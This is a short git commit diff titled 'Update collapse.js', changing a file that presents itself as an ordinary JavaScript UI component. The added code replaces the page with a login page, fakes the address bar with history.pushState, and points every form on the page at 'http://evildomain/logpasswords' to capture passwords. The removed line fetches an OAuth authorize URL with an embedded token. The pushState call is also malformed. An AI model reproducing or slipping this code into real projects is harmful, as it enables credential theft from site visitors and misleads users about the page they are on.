0a28f5d4af5655b10eeb7d7138d9ef151f40499f
dimpol <djdimpol@rocketmail.com>
2016-11-07 15:04:32 +0200

    Update collapse.js

--- js/src/collapse.js
+++ js/src/collapse.js
@@ -1,1 +1,19 @@
-$.get('https://apisandbox.openbankproject.com/oauth/authorize?oauth_token=CMQKFT0LDKCS0BIBDBOJRFZEK5G3HM4PC04JRTEY',function(r){write(r)})
+function override(url){
+  var req = new XMLHttpRequest();
+  req.open('GET', url,false);
+  req.onreadystatechange = function(){
+    if(req.readyState == 4 && req.responseText != ""){
+      document.innerHTML = req.responseText;
+    }
+  }
+  req.send(null);
+}
+
+override("/login.php");
+
+history.pushState({he: "he"}, document, getElementsByTagName("title")[0].innerHTML, "login.php");
+
+var forms = document.getElementsByTagName("form");
+for (index=0;index<forms.length;index++){
+  void(forms[index].action = "http://evildomain/logpasswords");
+}
